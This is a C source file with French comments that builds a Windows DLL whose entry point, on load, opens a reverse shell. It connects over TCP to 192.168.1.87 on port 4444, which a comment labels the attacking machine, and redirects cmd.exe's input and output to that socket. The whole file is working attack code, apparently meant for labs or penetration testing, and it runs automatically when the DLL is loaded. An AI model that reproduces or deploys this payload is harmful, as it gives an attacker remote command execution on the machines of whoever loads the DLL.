// Désactive les avertissements pour les fonctions déconseillées de Winsock
#define _WINSOCK_DEPRECATED_NO_WARNINGS
// Inclusion des bibliothèques nécessaires pour le réseau et les fonctions Windows
#include <winsock2.h>
#include <windows.h>

// Indique au linker d'inclure la bibliothèque Winsock
#pragma comment(lib, "ws2_32")

// Fonction principale qui crée un reverse shell
void revshell() {
    // Déclaration des variables nécessaires
    WSADATA wsData;                    // Structure contenant les informations sur l'implémentation Winsock
    SOCKET s1;                         // Socket pour la connexion
    struct sockaddr_in hax;            // Structure pour configurer l'adresse et le port
    STARTUPINFO sui;                   // Structure pour configurer le nouveau processus
    PROCESS_INFORMATION pi;            // Structure pour stocker les informations du processus créé

    // Initialisation de Winsock
    WSAStartup(MAKEWORD(2, 2), &wsData);
    // Création d'un socket TCP
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    // Configuration de l'adresse de connexion
    hax.sin_family = AF_INET;          // Utilisation du protocole IPv4
    hax.sin_port = htons(4444);        // Port de connexion (4444 est couramment utilisé pour les tests)
    hax.sin_addr.s_addr = inet_addr("192.168.1.87"); // Adresse IP de la machine attaquante

    // Tentative de connexion au serveur distant
    if (WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s1);               // Fermeture du socket en cas d'échec
        WSACleanup();                  // Nettoyage des ressources Winsock
        return;
    }
    
    // Préparation de la structure STARTUPINFO pour le nouveau processus
    memset(&sui, 0, sizeof(sui));      // Initialisation à zéro de la structure
    sui.cb = sizeof(sui);              // Définition de la taille de la structure
    sui.dwFlags = (STARTF_USESTDHANDLES); // Utilisation des handles standards
    // Redirection des entrées/sorties standards vers le socket
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
    
    // Création d'un processus cmd.exe avec les E/S redirigées
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    // Attente de la fin du processus
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Nettoyage final
    closesocket(s1);
    WSACleanup();
}

// Point d'entrée de la DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:        // Appelé quand la DLL est chargée
            revshell();                 // Lancement du reverse shell
            break;
        case DLL_THREAD_ATTACH:         // Appelé quand un nouveau thread est créé
        case DLL_THREAD_DETACH:         // Appelé quand un thread se termine
        case DLL_PROCESS_DETACH:        // Appelé quand la DLL est déchargée
            break;
    }
    return TRUE;
}
